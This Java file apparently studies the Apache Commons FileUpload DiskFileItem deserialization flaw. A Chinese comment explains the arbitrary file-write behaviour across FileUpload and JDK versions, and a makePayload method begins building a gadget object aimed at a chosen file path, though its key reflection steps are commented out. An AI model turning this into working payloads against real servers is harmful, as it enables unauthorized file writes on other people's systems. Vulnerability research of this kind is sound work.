package com.vailter.standard;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import org.apache.commons.io.output.ThresholdingOutputStream;
import org.reflections.Reflections;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;

/**
 * 漏洞的来源是在于 DiskFileItem中的 readObject()进行文件写入的操作，
 * 这就意味着如果我们对已经序列化的 DiskFileItem对象进行反序列化操作就能够触发 readObject()执行从而触发这个漏洞。
 * <p>
 * 1、FileUpload的 1.3.1 之前的版本配合JDK1.7之前的版本，能够达到写入任意文件的漏洞;
 * 2、FileUpload的 1.3.1 之前的版本配合JDK1.7及其之后的版本，能够向任意目录写入文件;
 * 3、FileUpload的 1.3.1 以及之后的版本只能向特定目录写入文件，此目录也必须存在。(文件的的命名也无法控制);
 */
public class DiskFileItemTest {

    private static DiskFileItem makePayload(int thresh, String repoPath, String filePath, byte[] data) throws IOException, Exception {
        // if thresh < written length, delete outputFile after copying to repository temp file
        // otherwise write the contents to repository temp file
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem(
                "testxxx",
                "application/octet-stream",
                false,
                "testxxx",
                100000,
                repository);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
        //OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        //Reflections.
        //os.write(data);
        //Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        //Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        //Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }
}
